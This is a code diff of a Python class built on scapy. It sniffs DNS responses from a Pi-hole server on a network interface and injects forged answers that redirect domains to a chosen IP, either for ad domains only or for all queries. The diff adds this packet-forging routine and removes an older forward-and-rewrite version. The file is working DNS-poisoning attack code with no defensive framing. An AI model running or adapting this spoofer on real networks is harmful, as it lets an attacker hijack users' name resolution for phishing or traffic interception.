@@ -1,8 +1,4 @@
 from scapy.all import *
-import signal
-from TimeoutException import TimeoutException
-import random
-import socket
 
 class Dns:
     'Dns class handles the DNS spoofing for all responses from Pi-hole'
@@ -11,67 +7,74 @@ class Dns:
     resultIP = ""
     verbose = False
     poisonType = ""
+    interface = ''
     
-    def __init__(self, piIP, resultIP, poisonType, verbose):
+    def __init__(self, piIP, resultIP, poisonType, interface, verbose):
         self.piIP = piIP
         self.resultIP = resultIP
+        self.interface = interface
         self.verbose = verbose
         return
-    
-    # Changes DNS responses sent by the Pi-hole for timeout seconds'
-    def spoofer(self, timeout):
-        if timeout > 0:
-            signal.signal(signal.SIGALRM, Dns.timeoutHandler)
-        try:
-            signal.alarm(timeout)
-            # Construct Berkeley Packet filter
-            filter = "ip host " + self.piIP + " and port 53"
-            #filter = "ip host 192.168.0.10"
-            sniff(filter=filter, prn=self.responder)
-        except TimeoutException:
-            return
 
-    # Changes the DNS request if necessary and forwards it
-    def responder(self, pkt):
-        print("pkt with (src,dst)" + pkt[IP].src + "  " + pkt[IP].dst)
-        # Forward requests to the dns server
-        if pkt[IP].dst == self.piIP:
-            send(pkt)
-            return
-        if pkt[IP].src != self.piIP:
-            return
-        print("pt = " + self.poisonType)
-        print("v = " + str(self.verbose))
-        if DNS in pkt and (pkt[DNS].opcode != 0 or pkt[DNS].ancount != 0):
-            return
-        # Check if we should change the packet
-        # Other changing behaviour should be implemented here
-        if (self.poisonType == "ads" and pkt[DNS].rdata == self.piIP) or self.poisonType == "complete":
-            if self.verbose:
-                print("Changed response for {} into resulting IP {}".format(pkt[DNS][DNSRR].rrname, resultIP))
-            # Change the packet
-            pkt[DNS].rdata = getIP(self.resultIP)
-        # Always forward the (possibly changed) answer
-        send(pkt)
-        return
+    # DNS query sniffer
+    def querysniff(self, pkt):
 
-    def getIP(IP):
-        if IP == "random":
-            result = ""
-            result += str(random.randint(0,255))
-            result += "."
-            result += str(random.randint(0,255))
-            result += "."
-            result += str(random.randint(0,255))
-            result += "."
-            result += str(random.randint(0,255))
-            return result
-        elif IP == "own":
-            return str(socket.gethostbyname(socket.gethostname()))
+        # If DNS layer exists AND
+        # if source is pihole AND
+        # there is an answer AND
+        # the answer is a valid IP AND
+        if pkt.haslayer(DNS) \
+                and pkt[IP].src == self.piIP \
+                and pkt[DNS].an \
+                and self.ip_checker(pkt[DNS].an.rdata):
+
+            # Poison only the ads
+            if self.poisonType == 'ads':
+                if pkt[DNS].an.rdata == self.piIP:
+                    resIP = pkt[IP]
+                    resUDP = pkt[UDP]
+                    resDNS = pkt[DNS]
+
+                    spoofed_ip = IP(src=resIP.src, dst=resIP.dst)
+                    spoofed_udp = UDP(sport=resUDP.sport, dport=resUDP.dport)
+                    spoofed_dnsrr = DNSRR(rrname=resDNS.qd.qname, rdata=self.resultIP)
+                    spoofed_dns = DNS(qr=1, id=resDNS.id, qd=resDNS.qd, an=spoofed_dnsrr)
+
+                    spoofed_pkt = spoofed_ip/spoofed_udp/spoofed_dns
+                    if self.verbose:
+                        print("Spoofed domain " + resDNS.qd.qname.decode('utf-8'))
+                    send(spoofed_pkt, verbose=False)
+
+            # Poison everything
+            else:
+                resIP = pkt[IP]
+                resUDP = pkt[UDP]
+                resDNS = pkt[DNS]
+
+                spoofed_ip = IP(src=resIP.src, dst=resIP.dst)
+                spoofed_udp = UDP(sport=resUDP.sport, dport=resUDP.dport)
+                spoofed_dnsrr = DNSRR(rrname=resDNS.qd.qname, rdata=self.resultIP)
+                spoofed_dns = DNS(qr=1, id=resDNS.id, qd=resDNS.qd, an=spoofed_dnsrr)
+
+                spoofed_pkt = spoofed_ip / spoofed_udp / spoofed_dns
+                if self.verbose:
+                    print("Spoofed domain " + resDNS.qd.qname.decode('utf-8'))
+                send(spoofed_pkt, verbose=False)
         else:
-            return IP
+            pass
+            # Allow other traffic
+            #send(pkt, verbose=False)
 
-    def timeoutHandler(signum, frame):
-        raise TimeoutException("Spoofing timeout")
+    def ip_checker(self, ip):
+        try:
+            parts = ip.split('.')
+            return len(parts) == 4 and all(0 <= int(part) < 256 for part in parts)
+        except ValueError:
+            return False # One of the "parts" cannot be casted as int
+        except(AttributeError, TypeError):
+            return False # ip is not a string
 
-    pass
+    def poison(self):
+        print("DNS poisoning...")
+        print("Press CTRL+C to exit")
+        sniff(iface=self.interface, filter='udp port 53', prn=self.querysniff, store=0)
